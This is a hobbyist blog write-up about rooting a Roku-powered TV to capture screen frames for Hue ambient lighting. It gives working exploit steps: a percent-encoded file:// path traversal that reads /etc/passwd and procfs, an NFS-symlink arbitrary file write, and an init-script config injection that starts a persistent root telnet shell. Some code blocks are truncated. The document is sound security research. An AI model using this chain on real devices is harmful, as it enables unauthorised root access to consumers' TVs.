<h2 id="the-problem">The Problem</h2>

<p>I’ve got two things in my living room.</p>

<h4 id="a-set-of-philips-hue-lights-that-provide-light-around-the-room">A set of Philips Hue lights that provide light around the room.</h4>

<p>The <a href="https://www.philips-hue.com/en-us">Hue lights</a> are really nice, allowing
you to change up the color and brightness to really change the look of your
environment. You can go from a bright white fluorescent light for studying to a
dim yellow nightlight for midnight lounging.</p>

<p>Moreover, Philips semi-recently released a feature called
<a href="https://www.philips-hue.com/en-us/entertainment">Hue Entertainment</a> that allows
you to sync up your lights to music, videos etc. This looks absolutely fantastic
and really makes watching movies and playing games a lot more immersive like
this:</p>

<p><img src="https://blog.ammaraskar.com/images/roku/light_sync_example.jpg" alt=""/></p>

<h4 id="a-50-inch-elment-4k-tv-powered-by-roku">A 50-inch Elment 4K TV powered by Roku.</h4>

<p>This <a href="https://elementelectronics.com/tv/400450-series/element-50-4k-uhd-hdr10-roku-tv">Element TV</a>
was one of the cheapest at the time and it has held up well over the years.</p>

<p>I don’t actually use any of the Roku/Smart TV functionality on it, instead
the primary sources on it are a Playstation, Xbox and Chromecast.</p>

<hr/>

<p>All of this brings us to the problem, the Hue ecosystem is blissfully unaware of
anything on the TV. The Hues need some sort of software that can read the pixel
values on the screen and set the lights to the right color. On the computer,
this is achieved through the use of the <a href="https://www.philips-hue.com/en-au/entertainment/hue-sync">Hue Sync App</a>,
a program that runs in the background capturing your screen and using it to
decide the colors.</p>

<p><img src="https://blog.ammaraskar.com/images/roku/hue_sync_app.png" alt=""/></p>

<p>However, when it comes to content playing on the TV, there is really no easy way
to pump the pixel data to your controller software. You could mirror your
computer screen with an HDMI cable but that’s doesn’t allow you to capture stuff
like game consoles and requires you to playback all your media on your computer.</p>

<p>If you wanna pay an arm and a leg, Philips has a device called an
<a href="https://www.philips-hue.com/en-us/p/hue-play-hdmi-sync-box-/046677555221">HDMI Sync Box</a>.
It costs <strong>$230</strong> at the time of writing, almost the price of the actual TV!
The sync box works as a 4-way HDMI switcher, you plug in all your devices like
your Chromecast and consoles into it and then you can select which one to pass
through. It listens in on the video signal and then uses it to match the lights.
Simple enough but stupidly expensive.</p>

<p>On the other hand homebrew solutions for this vary widely. One of the most
promising ones has been using an HDMI splitter that takes the signals and sends
it to two outputs. You plug one into the TV and plug the other into a capture
card hooked up to a Raspberry Pi. The Pi then uses software written by the
<a href="https://github.com/MCPCapital/harmonizeproject">Harmonize Project</a> to sync
up the lights.</p>

<p>One solution that I used for a little while was to have a Raspberry Pi hooked
up with a camera looking at the screen. Perform some perspective warping and
then detect the colors on screen with that. This was pretty appealing since it
requires no fuffing about with HDMI cables or splitters. You can find an example
of such code here as part of the <a href="https://github.com/PropaneDragon/PiHueEntertainment">PiHueEntertainment project</a>.
You can find my own hacky disgusting code to do the same thing <a href="https://github.com/ammaraskar/PiHue">here</a>.</p>

<h2 id="roku-tvs">Roku TVs</h2>

<p>Alright, now that we know a bit about the problem, let’s talk about Roku
powered TVs.</p>

<p>Roku devices themselves are positively ancient, they came out in 2008 and
predate the creation of Chromecasts, Fire TV sticks, AppleTV etc. They
popularized the lightweight streaming device area, allowing people to watch
Netflix, Youtube, Hulu and friends on their TVs in a super convenient way.</p>

<p>Starting in the mid 2010s, we started seeing the popularization of “smart TVs”.
As opposed to “dumb TVs” that can only display what you plug into them, these
smart TVs started integrating streaming features into the TV itself. This meant
that TVs themselves started being able to connect to the internet and have
enough hardware to stream and decode video.</p>

<p>Roku, realizing they had already built up a software stack and ecosystem in this
area partnered with TV manufacturers to provide Roku as the operating system
for these Smart TVs. This partnership was generally done with low-end
TV makers like TCL, Hisense and my own Element. These companies would generally
not be able to write their own smart TV software unlike the big players:
Samsung, LG, Sony etc.</p>

<p>Now these Roku TVs have one particularly creepy and privacy intrusive “feature.”
The TV will look at the content you’re watching from your HDMI/cable or other
devices and advertise watching them from the beginning on their own smart
services. <a href="https://www.theverge.com/2017/4/11/15261508/roku-tv-cable-viewing-tracking-netflix-hulu">This Verge article</a>
goes into it in a bit more detail. It shows up on the TV like this:</p>

<p><img src="https://blog.ammaraskar.com/images/roku/watch_from_beginning.jpg" alt=""/></p>

<p>The presence of this advertising indicates that the TV is capable of monitoring
what is being played through its inputs and encouraged me to start looking for
a way to try to get my own code running on it.</p>

<h2 id="hacking-the-roku">Hacking the Roku</h2>

<h3 id="the-roku-developer-ecosystem">The Roku Developer Ecosystem</h3>

<p>Within Roku’s operating system, each streaming service is serviced in the form
of an app which Roku calls a “channel”. These apps/channels can be obtained from
Roku’s marketplace and allow services like Netflix, ESPN, Youtube etc to make
their interfaces and streams available on Roku devices.</p>

<p>The selection of Roku channels is massive and ranges from the big name streaming
services to little games: <a href="https://channelstore.roku.com/browse/apps">https://channelstore.roku.com/browse/apps</a></p>

<p>As such, Roku has an SDK so that you can developer your own little Roku app.
The process for developing an app is quite open, allowing you to use your own
device as a development environment as long as you know the right button combo
to press. Much like Android where you tap the <code>Build Number</code> button in the
about page to enable developer options, on Roku you enter a Konami-code like
sequence.</p>

<p>Roku’s <a href="https://developer.roku.com/docs/developer-program/getting-started/developer-setup.md">developer setup</a>
page goes over the details, at the time of writing you just had to press
<code>(Home, Home, Home, Up, Up, Right, Left, Right, Left, Right)</code> to be brought to
the developer settings. Once active, your TV starts up a web server that lets
you upload apps packaged as <code>zip</code> files.</p>

<h3 id="coding-roku-apps">Coding Roku Apps</h3>

<p>Great, so this allowed me to run my own apps on the Roku. Now what are these
apps actually programmed in?</p>

<p>As it turns out, Roku has rolled their own programming called BrightScript. And
it is based on, of all things, Basic.</p>

<p>In their own words, BrightScript is an interpreted language running on a C-based
interpreter.</p>

<blockquote>
  <p>BrightScript compiles code into bytecode that is run by an interpreter. This
compilation step happens every time a script is loaded and run. There is no
separate compile step that results in a binary file being saved. In this way
it is similar to JavaScript.</p>

  <p>BrightScript is a powerful bytecode-interpreted scripting language optimized
for embedded devices. In this way it is unique. For example, BrightScript and
the BrightScript component architecture are written in 100% C for speed,
efficiency, and portability.</p>
</blockquote>

<p>As anyone who has tried to sandbox a capable language will tell you, it is a
fairly tough job. Correctly restricting things like filesystem access, ensuring
you don’t accidentally expose library functions and the like without support
from the operating system such as with cgroups is very tough. On an embedded
system such isolation was unlikely so BrightScript was likely going to be a good
place to start to find exploits.</p>

<p>BrightScript is fairly powerful, it has bindings for stuff like OpenSSL,
UDP/TCP sockets and JSON parsing. After uploading the hello world app and
having a glance at the developer documentation, I quickly realized there was
actually an <a href="https://developer.roku.com/docs/developer-program/debugging/debugging-channels.md">interactive REPL for Brightscript</a>
running on a telnet server on the TV.</p>

<p>We can hop onto the Brightscript REPL server with <code>telnet 192.168.1.69 8085</code>
and start exploring:</p>

<span>}</span>
</code></pre></div></div>

<p>As it turns out, my TV model, the <code>7000X</code> is fairly powerful according to
<a href="https://developer.roku.com/docs/specs/hardware.md">Roku’s specs</a>.</p>

<h3 id="a-vulnerable-api-function">A Vulnerable API Function</h3>

<p>The next step was to explore the API surface and one really interesting aspect
of this was the <code>roUrlTransfer</code>
<a href="https://developer.roku.com/en-gb/docs/references/brightscript/components/rourltransfer.md">object</a>
which essentially allows you to make http requests. For example:</p>

<div><div><pre><code><span>Brightscript</span> <span>Debugger</span><span>&gt;</span> <span>r</span> <span>=</span> <span>CreateObject</span><span>(</span><span>&#34;roUrlTransfer&#34;</span><span>)</span>
<span>Brightscript</span> <span>Debugger</span><span>&gt;</span> <span>r</span><span>.</span><span>SetUrl</span><span>(</span><span>&#34;http://example.com&#34;</span><span>)</span>
<span>Brightscript</span> <span>Debugger</span><span>&gt;</span> <span>?</span> <span>r</span><span>.</span><span>GetToString</span><span>()</span>
<span>&lt;</span><span>!</span><span>doctype</span> <span>html</span><span>&gt;</span>
<span>&lt;</span><span>html</span><span>&gt;</span>
<span>&lt;</span><span>head</span><span>&gt;</span>
    <span>&lt;</span><span>title</span><span>&gt;</span><span>Example</span> <span>Domain</span><span>&lt;/</span><span>title</span><span>&gt;</span>
</code></pre></div></div>

<p>Where there’s http on embedded devices, <a href="https://curl.se/">curl</a> or
<a href="https://curl.se/libcurl/">libcurl</a> is usually close behind. The documentation
on the <code>ifUrlTransfer</code> page also confirms this:</p>

<blockquote>
  <p><strong>EnablePeerVerification(enable as Boolean) as Boolean</strong></p>

  <p>Verifies that the certificate has a chain of trust up to a valid root
certificate using <code>CURLOPT_SSL_VERIFYPEER</code>.</p>
</blockquote>

<p>One key thing to realize about curl is that even though it is primarily used for
web requests, it supports a wide variety of <a href="https://everything.curl.dev/protocols/curl">other protocols</a>
(these can be
disabled during compilation) such as:</p>

<ul>
  <li><code>ftp://</code> - File Transfer Protocol</li>
  <li><code>gopher://</code> - The Gopher Protocol</li>
</ul>

<p>but most importantly for us, it supports the <code>file://</code> protocol that lets you
grab files from the local file system. For example on your machine running</p>

<div><div><pre><code><span>$ </span>curl file:///etc/passwd
root:x:0:0:root:/root:/bin/bash
</code></pre></div></div>

<p>will grab the contents of <code>/etc/passwd</code>.</p>

<p>Could it really be this easy? Could we just grab files off the Roku like this?
Sadly, no.</p>

<div><div><pre><code><span>Brightscript</span> <span>Debugger</span><span>&gt;</span> <span>r</span><span>.</span><span>SetUrl</span><span>(</span><span>&#34;file:///etc/passwd&#34;</span><span>)</span>
<span>***</span> <span>ERROR</span><span>:</span> <span>Missing</span> <span>or</span> <span>invalid</span> <span>PHY</span><span>:</span> <span>&#39;/etc/passwd&#39;</span>
</code></pre></div></div>

<p>Clearly there was <em>some</em> attempt to restrict the <code>file://</code> protocol, but how
good was this attempt? As it turns out, not really. Roku wanted you to be able
to use <code>file://</code> to access files that you could access through the normal file
APIs they provide, so for exmaple you can do:</p>

<div><div><pre><code><span>Brightscript</span> <span>Debugger</span><span>&gt;</span> <span>r</span><span>.</span><span>SetUrl</span><span>(</span><span>&#34;file://pkg:/manifest&#34;</span><span>)</span>
<span>Brightscript</span> <span>Debugger</span><span>&gt;</span> <span>?</span> <span>r</span><span>.</span><span>GetToString</span><span>()</span>
<span>##</span>   <span>Channel</span> <span>Details</span>
<span>title</span><span>=</span><span>Hello</span> <span>World</span>
</code></pre></div></div>

<p>If we acctually run the <code>GetUrl()</code> method after performing this, we can see what
the BrightScript internals end up rewriting this into:</p>

<div><div><pre><code><span>?</span> <span>r</span><span>.</span><span>GetUrl</span><span>()</span>
<span>file</span><span>:</span><span>///</span><span>tmp</span><span>/</span><span>plugin</span><span>/</span><span>GPAAAAX4Lckh</span><span>/</span><span>pkg</span><span>:</span><span>/</span><span>manifest</span>
</code></pre></div></div>

<p>exposing some nice internal paths to us. But this also shows that they seem to
be concatening our url path in front of <code>tmp/plugin/GPAAAAX4Lckh/</code> so could
we just use the <code>../..</code> characters in the URL to traverse up the path?</p>

<div><div><pre><code><span>Brightscript</span> <span>Debugger</span><span>&gt;</span> <span>r</span><span>.</span><span>SetUrl</span><span>(</span><span>&#34;file://pkg:/../../../../etc/passwd&#34;</span><span>)</span>
<span>Brightscript</span> <span>Debugger</span><span>&gt;</span> <span>?</span> <span>r</span><span>.</span><span>GetUrl</span><span>()</span>
<span>file</span><span>:</span><span>///</span><span>tmp</span><span>/</span><span>plugin</span><span>/</span><span>GPAAAAX4Lckh</span><span>/</span><span>pkg</span><span>:</span><span>/</span><span>etc</span><span>/</span><span>passwd</span>
</code></pre></div></div>

<p>Not quite, looks like there’s some magic going on that strips out the dot dots
out of the url. However, there seems to be one simple trick that the Roku
developers forgot about. URLs support <a href="https://en.wikipedia.org/wiki/Percent-encoding">url/percent encoding</a>,
so instead of putting in the raw <code>..</code> we can replace it with the equivelant
percent encoded characters, <code>%2E%2E</code>. This gives us the url:</p>

<div><div><pre><code><span>r</span><span>.</span><span>SetUrl</span><span>(</span><span>&#34;file://pkg:/%2E%2E/%2E%2E/%2E%2E/%2E%2E/etc/passwd&#34;</span><span>)</span>
</code></pre></div></div>

<p>Checking <code>r.GetUrl()</code> again, this time we see:</p>

<div><div><pre><code><span>Brightscript</span> <span>Debugger</span><span>&gt;</span> <span>?</span> <span>r</span><span>.</span><span>GetUrl</span><span>()</span>
<span>file</span><span>:</span><span>///</span><span>tmp</span><span>/</span><span>plugin</span><span>/</span><span>GPAAAAX4Lckh</span><span>/</span><span>pkg</span><span>:</span><span>/</span><span>%</span><span>2</span><span>E</span><span>%</span><span>2</span><span>E</span><span>/</span><span>%</span><span>2</span><span>E</span><span>%</span><span>2</span><span>E</span><span>/</span><span>%</span><span>2</span><span>E</span><span>%</span><span>2</span><span>E</span><span>/</span><span>%</span><span>2</span><span>E</span><span>%</span><span>2</span><span>E</span><span>/</span><span>etc</span><span>/</span><span>passwd</span>
</code></pre></div></div>

<p>Cool, the traversal characters didn’t get stripped out, so I crossed my fingers
and fired off:</p>

<p>So at this point we have the ability to read files from the system, but what
does this really give us? Well Linux is awesome and exposes a lot of critical
information through <a href="https://en.wikipedia.org/wiki/Procfs">procfs</a> usually
present under <code>/proc/</code> on the system.</p>

<p>For example, the file <code>/proc/self/environ</code> will tell you the environment
variables the file-reading process was launched with:</p>

<div><div><pre><code><span>$ TEST</span><span>=</span>123 <span>cat</span> /proc/self/environ
<span>TEST</span><span>=</span>123
<span>SHELL</span><span>=</span>/bin/bash
</code></pre></div></div>

<p>Among other things, procfs also exposes the memory map of a process, e.g what
memory addresses parts of the executable, shared libraries, the stack and heap
are present at. This is usually found at <code>/proc/self/maps</code>.</p>

<p>procfs can also tell you what filesystems are mounted on the system through
<code>/proc/mounts</code>.</p>

<p>Both of these were absolutely valuable in performing reconnaissance and
understanding how Roku had set up their Linux distribution. For example through
<code>/proc/version</code> we can learn what kernel the Roku is using:</p>

<div><div><pre><code>Linux version 3.10.108-grsec-rt122 (<a href="https://blog.ammaraskar.com/cdn-cgi/l/email-protection" data-cfemail="553036677820263027153c25786465786764607864646778646c7b303b327b273a3e207b363a38">[email protected]</a>)

#1 SMP PREEMPT Thu Jul 16 21:50:19 UTC 2020
</code></pre></div></div>

<p>Through <code>/proc/self/maps</code> we learn that the main Roku application that runs
on the TV lives under <code>/bin/Application</code> and it utilizes a ton of shared
libraries:</p>

<div><div><pre><code>00010000-00c82000 r-xp 00000000 fd:fa 2272       /bin/Application
00c92000-00c9a000 r--p 00c72000 fd:fa 2272       /bin/Application
00c9a000-00cb0000 rw-p 00c7a000 fd:fa 2272       /bin/Application
...
6b104000-6b21a000 r-xp 00000000 fd:fa 2606       /lib/libPlayReady.so
...
ac975000-ac9c6000 r-xp 00000000 fd:fa 2574       /lib/libBrightScript.so
</code></pre></div></div>

<p>Through this information we can acquire the application binary as well as the
key libraries and pop them open in ghidra to understand how they work. As it
turns out the Roku software stack is a gaint C++ application. As someone who is
primarily used to reverse-engineering C this presented a bit of a learning curve
but once you figure out the usual suspects like <code>std::string</code> and <code>std::vector</code>,
it becomes a lot easier. It also helped that the system uses lots of shared
libraries so there are a lot of exported symbol names present.</p>

<p>Grabbing binary files was a little more complex than simple text files, this is
because BrightScript strings are null terminated and thus the <code>r.GetToString()</code>
function would only return results up to the first null byte, making it useless
for ELFs and other binaries. We ended up finding a work-around by saving the
data to a file with <code>r.GetToFile(&#34;tmp:/file_to_save&#34;)</code> and then streaming it
over the network in chunks that could be held in memory or saving it to a USB
drive using <code>r.GetToFile(&#34;ext1:/file&#34;)</code>.</p>

<p>At this point, I realized that my method of downloading one file at a time was
fairly limited and only gave me a fairly narrow view on what was on the system.
So we took a look at <code>/proc/cmdline</code>:</p>

find:</p>

<p>Awesome, it’s in an intact squashfs filesystem and a bunch of extra stuff tacked
on at the end. Having binwalk extract out the squashfs we find:</p>

<div><div><pre><code>$ ls disk_image
bin     config  dev  home  lib      media  nvram  opt      proc    root  sdcard0  sys  usr  www
common  custom  etc  init  linuxrc  mnt    omv    plugins  RokuOS  sbin  sdcard1  tmp  var
</code></pre></div></div>

<p>This made it significantly easier to understand the overall structure of the
system and find exploits in more than just the main application binary.</p>

<h3 id="getting-more-access">Getting More Access</h3>

<p>While we could read files and understand the behavior of the system pretty
thoroughly, we were still pretty far from code execution. At this
point I met a couple of really smart hackers on the Exploiteers discord,
<a href="https://twitter.com/rmDevNull">devnull</a> and popeax who helped a lot by sharing
information and tricks they had discovered.</p>

<p>We were able to discover an undocumented feature in <code>/bin/Application</code> that
Roku had implemented to make the development process a lot easier. Instead of
constantly re-uploading a <code>.zip</code> file to test your channel, they allowed
running a channel through from a <a href="https://en.wikipedia.org/wiki/Network_File_System">Network File System (NFS)</a>
mount. NFS basically allows you to mount directories from other servers over a
network connection. You could utilize this feature by adding the key
<code>pkg_nfs_mount</code> like so:</p>

<div><div><pre><code>pkg_nfs_mount=192.168.1.10:/nfs/mnt/path
</code></pre></div></div>

<p>to your channel manifest. Upon seeing this in the manifest, the channel loader
will try to mount the NFS server and directory you specified and then read the
source files from there.</p>

<p>The key thing to realize about an NFS mount is that it supports all the features
of a Linux filesystem, including the ability to have symlinks. So for example
if on your NFS server you have a symlink set up pointing to <code>/</code> like so:</p>

<div><div><pre><code><a href="https://blog.ammaraskar.com/cdn-cgi/l/email-protection" data-cfemail="79181414180b39171f0a540a1c0b0f1c0b">[email protected]</a>:/media/nfs<span>$ </span><span>ls</span> <span>-la</span> <span>.</span>
drwxr-xr-x 5 root  root  4096 Apr 23 12:13 <span>.</span>
drwxr-xr-x 3 root  root  4096 Mar 24 06:53 ..
<span>-rw-r--r--</span> 1 root  root   876 Apr 23 12:13 manifest
lrwxrwxrwx 1 root  root     1 Mar 24 06:56 root -&gt; /
</code></pre></div></div>

<p>then anyone who mounts the directory will also see:</p>

<div><div><pre><code><a href="https://blog.ammaraskar.com/cdn-cgi/l/email-protection" data-cfemail="d2b3bfbfb3a092bcb4a1ffb1bebbb7bca6">[email protected]</a>:~<span>$ </span><span>ls</span> <span>-la</span> /tmp/test-mount/root
lrwxrwxrwx 1 root root 1 Mar 24 06:56 /tmp/test-mount/root -&gt; /
</code></pre></div></div>

<p>Importantly, this symlink is resolved on the end of whoever mounted it, so
accessing the file <code>/tmp/test-mount/root/etc/passwd</code> will actually lead to the
<code>/etc/passwd</code> file on the <code>nfs-client</code> system.</p>

<p>Now the implications for this in terms of BrightScript access are absolutely
huge, while we could only read files with the curl based exploit, this actually
lets us write to arbitrary locations in the filesystem too. Ordinarily the
BrightScript filesystem restricts you to locations such as <code>pkg:/</code>, <code>tmp:/</code>,
<code>ext1:/</code> etc and has robust protection against traversal, a symlink such as the
one from the method above is not detected.</p>

<p>This means that we can now use BrightScript methods such as <code>WriteAsciiFile</code> to
write to anywhere on the filesystem. For example:</p>

<div><div><pre><code><span>WriteAsciiFile</span><span>(</span><span>&#34;pkg:/root/tmp/test&#34;</span><span>,</span> <span>&#34;hello world&#34;</span><span>)</span>
</code></pre></div></div>

<p>and this actually shows up on the Roku under <code>/tmp/test</code>.</p>

<p>Great so through some reverse engineering and a little help from our friends
we’ve turned our arbitrary read into an arbitrary read-write.</p>

<h3 id="code-execution-from-writing-files">Code Execution from Writing Files</h3>

<p>Despite being able to write to anywhere, we are still fairly limited. The actual
filesystem is mounted as read-only for almost all directories. This means that
getting code execution won’t be as simple as replacing <code>/bin/Application</code> or
anything like that.</p>

<p>In particular, the only directories that were writable were <code>/tmp</code> and <code>/nvram</code>.
<code>/tmp</code> is as it would be on a conventional Linux system, a temporary file
system. <code>/nvram</code> is a non-volatile storage location that stores data such as the
channels installed by the user, channel specific login information and system
settings and preferences.</p>

<p>Would it be possible to get code execution from writing into one of these
directories? At first glance it seemed fairly difficult, while a lot of init
scripts will execute stuff stored in <code>/nvram</code>, for example <code>S56sound</code>:</p>

<div><div><pre><code><span>#!/bin/sh</span>
<span># Dev mode local override</span>
<span>read </span>roku_dev_mode rest &lt; /proc/cmdline
<span>if</span> <span>[</span> <span>&#34;</span><span>$roku_dev_mode</span><span>&#34;</span> <span>=</span> <span>&#39;dev=1&#39;</span> <span>]</span> <span>&amp;&amp;</span> <span>[</span> <span>-f</span> /nvram/S86sound <span>]</span>
<span>then
    </span><span>echo</span> <span>&#34;=== ALSA INIT from /nvram/S86sound&#34;</span>
    <span>source</span> /nvram/S86sound
<span>else
    </span>modprobe mhal-alsa-audio <span>||</span> <span>echo</span> <span>&#34;WARNING:  ALSA driver not found or failed to load&#34;</span>
<span>fi</span>
</code></pre></div></div>

<p>these are guarded by <code>&#34;$roku_dev_mode&#34; = &#39;dev=1&#39;</code> checks which is a parameter
set in <code>/proc/cmdline</code> (the Linux startup parameters) for Roku development
machines.</p>

<p>Eventually after searching all across the application and system scripts in the
disk image we stumbled upon the following code as part of the <code>S64wifi</code> init
script:</p>

<div><div><pre><code><span>UDHCPD_CONF</span><span>=</span>/lib/wlan/realtek/udhcpd-p2p.conf
<span>[</span> <span>-f</span> /nvram/udhcpd-p2p.conf <span>]</span> <span>&amp;&amp;</span> <span>UDHCPD_CONF</span><span>=</span>/nvram/udhcpd-p2p.conf
<span>cp</span> <span>$UDHCPD_CONF</span> /tmp/udhcpd-p2p.conf
<span>echo</span> <span>&#34;interface </span><span>$P2PINTF</span><span>&#34;</span> <span>&gt;&gt;</span> /tmp/udhcpd-p2p.conf
udhcpd /tmp/udhcpd-p2p.conf
</code></pre></div></div>

<p>Let’s take a minute to examine what this is doing.</p>

<ol>
  <li>Set <code>UDHCPD_CONF</code> to default to <code>/lib/wlan/realtek/udhcpd-p2p.conf</code>.</li>
  <li>If <code>/nvram/udhcpd-p2p.conf</code> exists, override <code>UDHCPD_CONF</code> with that file.</li>
  <li>Copy the <code>UDHCPD_CONF</code> file to <code>/tmp/udhcpd-p2p.conf</code>.</li>
  <li>Start up <a href="https://udhcp.busybox.net/"><code>udhcpd</code></a>
(A light-weight <a href="https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol">DHCP</a>
 server part of busybox)
using the configuration file in <code>/tmp/udhcpd-p2p.conf</code>.</li>
</ol>

<p>This means that we fully control all configuration parameters to <code>udhcpd</code> if we
set up our own <code>/nvram/udhcpd-p2p.conf</code> file, which the arbitrary file write
exploit allows us to do.</p>

<p>Despite busybox’s reputation of being lightweight, you can expect that any
daemon will have a fun set of options and <code>udhpcd</code> is no exception. It provides
this absolutely fantastic option called <code>notify_file</code> which is described as:</p>

<blockquote>
  <p>Everytime udhcpd writes a leases file, the below script will be called.</p>

  <p>Useful for writing the lease file to flash every few hours.</p>

  <p><code>#notify_file        #default: (no script)</code></p>
</blockquote>

<p>And there we have it, as soon as <code>udhcpd</code> hands out a lease, it will invoke the
<code>notify_file</code> we specified. As a cherry on top, <code>udhcpd</code> runs as root as part of
the startup process, so whatever script we provide it will run as root.</p>

<p>For those curious, the Roku has a dhcp server because it supports connecting
certain remotes and devices over a Wi-Fi Direct network.</p>

<p>While I initially ended up connecting my phone to trigger a lease to be handed
out, we also realized that turning <code>auto_time</code> to a very tiny interval will also
cause <code>notify_file</code> to be invoked and this allows the root to be persistent
across restarts without any human intervention.</p>

<p>With this in hand, we set up a script file containing</p>

<div><div><pre><code><span>#!/bin/sh</span>
busybox telnetd <span>-l</span> /sbin/loginsh <span>-p</span> 1337
</code></pre></div></div>

<p>point <code>notify_file</code> towards it and as soon as a lease is handed out we have a
root telnet server on port 1337:</p>

<div><div><pre><code><span>$ </span>telnet 192.168.1.69 1337
Trying 192.168.1.69...
Connected to 192.168.1.69.
Escape character is <span>&#39;^]&#39;</span><span>.</span>

WIFI DRIVER PATH: /lib/wlan/realtek
longview:/ <span># whoami</span>
root
</code></pre></div></div>

<h2 id="from-code-execution-to-ambient-lighting">From Code Execution to Ambient Lighting</h2>

<h3 id="reverse-engineering-the-tvs-recognition">Reverse Engineering the TV’s Recognition</h3>

<p>Alright so that was a whole adventure to get code execution going, now we can
finally get to the problem that kicked this all off. Getting the TV to control
the lights based on the content it is showing.</p>

<p>So back to the creepy feature I talked about in the introduction, in Roku and
industry speak it is known as “Automatic Content Recognition” (ACR), Roku
themselves describe it as:</p>

<blockquote>
  <p>The Roku TV is also equipped with Automatic Content Recognition (ACR)
technology that, when enabled, allows Roku to recognize the programs and
commercials being viewed through the Roku TV’s antenna, and devices connected
to your Roku TV, including cable and satellite set top boxes.</p>
</blockquote>

<p>so searching for symbols related to “ACR” in the reverse engineered codebase
was a good place to start.</p>

<p>One of the symbols we find is <code>gnsdk_acr_query_write_video_frame</code>. For those
wondering, it looks like Roku uses <a href="https://www.gracenote.com/video/advanced-discovery/">Gracenote’s ACR library</a>,
hence the <code>gnsdk</code>.</p>

<p>If we look at the caller of the function, it comes with the following logging
calls:</p>

<div><div><pre><code><span>Roku</span><span>::</span><span>Log</span><span>::</span><span>Logger</span><span>::</span><span>log</span><span>(</span>
  <span>s_acr</span><span>.</span><span>gn</span><span>.</span><span>_00ca3837</span><span>,</span> <span>&#34;thrd.exit.early.nullptr&#34;</span><span>,</span>
  <span>&#34;Could not create VideoCapture device&#34;</span>
<span>);</span>

<span>Roku</span><span>::</span><span>Log</span><span>::</span><span>Logger</span><span>::</span><span>logTrace</span><span>(</span>
  <span>s_acr</span><span>.</span><span>gn</span><span>.</span><span>_00ca3837</span><span>,</span> <span>&#34;cap.toosmall&#34;</span><span>,</span>
  <span>&#34;captured frame too small, width %d&#34;</span><span>,</span> <span>iVar3</span><span>);</span>

<span>Roku</span><span>::</span><span>Log</span><span>::</span><span>Logger</span><span>::</span><span>logTrace</span><span>(</span>
  <span>s_acr</span><span>.</span><span>gn</span><span>.</span><span>_00ca3837</span><span>,</span> <span>&#34;thrd.pause&#34;</span><span>,</span>
  <span>&#34;Capture loop is paused&#34;</span><span>);</span>
</code></pre></div></div>

<p>This is definitely all stuff related to capturing the output of the screen,
putting us on the right track.</p>

<p>In particular the <code>&#34;Could not create VideoCapture device&#34;</code> logging call is very
interesting, it is present under the following context:</p>

<div><div><pre><code><span>av_instance</span> <span>=</span> <span>Roku</span><span>::</span><span>PlatformAV</span><span>::</span><span>GetInstance</span><span>();</span>
<span>videoCaptureDevice</span> <span>=</span> <span>(</span><span>av_instance</span><span>-&gt;</span><span>vtable</span> <span>+</span> <span>0x24</span><span>)(</span><span>av_instance</span><span>);</span>

<span>if</span> <span>((</span><span>int</span><span>)</span><span>videoCaptureDevice</span> <span>==</span> <span>0</span><span>)</span> <span>{</span>
  <span>Roku</span><span>::</span><span>Log</span><span>::</span><span>Logger</span><span>::</span><span>log</span><span>(</span>
    <span>s_acr</span><span>.</span><span>gn</span><span>.</span><span>_00ca3837</span><span>,</span> <span>&#34;thrd.exit.early.nullptr&#34;</span><span>,</span>
    <span>&#34;Could not create VideoCapture device&#34;</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>meaning the code we are after is going to be under the <code>PlatformAV</code> class, and
specifically as part of one of the methods it implemenets. Following this chain
of code down to the <code>VideoCapture</code> class and doing some reverse engineering we
find that it does the following:</p>

<div><div><pre><code><span>IDirectFB</span> <span>*</span><span>dfb</span> <span>=</span> <span>...;</span>

<p>This was an absolute pain to reverse, but once done led exactly to the critical
library in the capturing process. These <code>CreateDataBuffer</code> and
<code>CreateImageProvider</code> functions are provided by a library called
<a href="https://en.wikipedia.org/wiki/DirectFB">DirectFB</a> (Direct Frame Buffer) which
is what Roku uses to draw to the TV.</p>

<p>Thanks to DirectFB being licensed under the LGPL, Roku releases their
modifications as part of their <a href="https://roku.app.box.com/v/RokuOpenSourceSoftware">OpenSourceSoftware dropbox</a>. So I grabbed
<code>Roku Open Source Software &gt; 9.4.0 &gt; OSS-RokuHDRTV &gt; sources &gt; directfb-1.4.2</code>
and started taking a look.</p>

<h3 id="writing-our-own-screen-capture-code">Writing our own Screen Capture Code</h3>

<p>The directfb source code provided by Roku was an absolute treasure trove of
information. As it turns out the Roku TV uses a chip by
<a href="https://www.mstarsemi.com/">MStar Semiconductors</a> that is responsible for
dealing with all the HDMI functionality of the TV. This includes decoding the
HDCP DRM system, switching inputs etc.</p>

<p>As part of the directfb source provided by Roku are examples provided by MStar,
which demonstrate exactly how to use the MStar’s capturing API. In particular,
the <code>&#34;GOPC&#34;</code> stuff we saw in the Roku code above corresponds to a DirectFB
image provider that utilizes the MStar GOP API to capture the image on screen.
I’m not sure what GOP stands for here, if anyone does please let me know.</p>

<p>This capture device uses pretty low-level MStar APIs internally, e.g
<code>MApi_GOP_DWIN_Init()</code> and <code>MApi_GOP_SetClkForCapture()</code> to provide a high
level API to capture the screen. From what I can tell the MStar chip performs
a Direct Memory Access (DMA) into the memory of the Roku to place the image into
it. Either way, the low level details aren’t too important, what we can take
away from this is that we should be able to write our own <code>DirectFB</code> code and
capture the screen.</p>

<p>Thus I set up a development environment on my Raspberry Pi so I could compile
for ARM and hacked away. Luckily the <code>Makefile</code> in the <code>directfb</code> sources that
Roku provide told me exactly how to compile my program:</p>

<p>I shoved the libraries from the disk image I retrieved earlier and started off
the process with a very simple hello-directfb program:</p>

<div><div><pre><code><span>#include &lt;directfb.h&gt;
</span>
<span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span><span>**</span> <span>argv</span><span>)</span> <span>{</span>

    <span>DirectFBCreate</span><span>(</span><span>&amp;</span><span>dfb</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>After this I loosely followed the reverse-engineered code from the Roku
<code>VideoCapture</code> class and created a GOPC image provider with</p>

<div><div><pre><code>#GOPC
gopc_capture_w=3840
gopc_capture_h=2160
</code></pre></div></div>

<p>and used</p>

<div><div><pre><code>    <span>imageProvider</span><span>-&gt;</span><span>RenderTo</span><span>(</span><span>imageProvider</span><span>,</span> <span>surface</span><span>,</span> <span>NULL</span><span>);</span>

</code></pre></div></div>

<p>With that I was blisfully met with a <code>test-00000.bmp</code> that contained:</p>

<p><img src="https://blog.ammaraskar.com/images/roku/test_0000.jpg" alt=""/></p>

